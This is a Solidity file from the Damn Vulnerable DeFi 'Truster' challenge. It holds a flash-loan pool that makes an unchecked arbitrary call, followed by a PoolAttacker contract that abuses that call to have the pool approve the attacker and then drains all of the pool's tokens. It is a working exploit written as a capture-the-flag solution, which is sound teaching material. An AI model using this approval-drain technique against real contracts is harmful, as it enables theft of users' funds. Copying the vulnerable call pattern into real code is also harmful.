// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// pool attacker contract is placed after TrusterLenderPool contract .

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}


// coded by Abolfazl Iraninasab
contract PoolAttacker{

    address owner ;
    constructor(){
        owner = msg.sender ;
    }

    // in this code , I use low-level interaction method for interacting with pool and token contract .
    // of course we can use interfaces for this purpose but I prefered to use low-level interaction method in this condition.

    function attack(address _pool, address _token) public  {
        require(msg.sender == owner , "only owner can execute attack function!");
        (bool success1, bytes memory data1 )= _token.call(abi.encodeWithSignature("balanceOf(address)",_pool));
        require(success1, "pool balance check failed");
        uint balance = abi.decode(data1,(uint));

        bytes memory data2 = abi.encodeWithSignature("approve(address,uint256)",address(this),balance);
        TrusterLenderPool(_pool).flashLoan(0, address(this), _token, data2);
        (bool success2, )= _token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)",_pool, owner, balance));
        require(success2, "transfer token failed");

    }
}

    

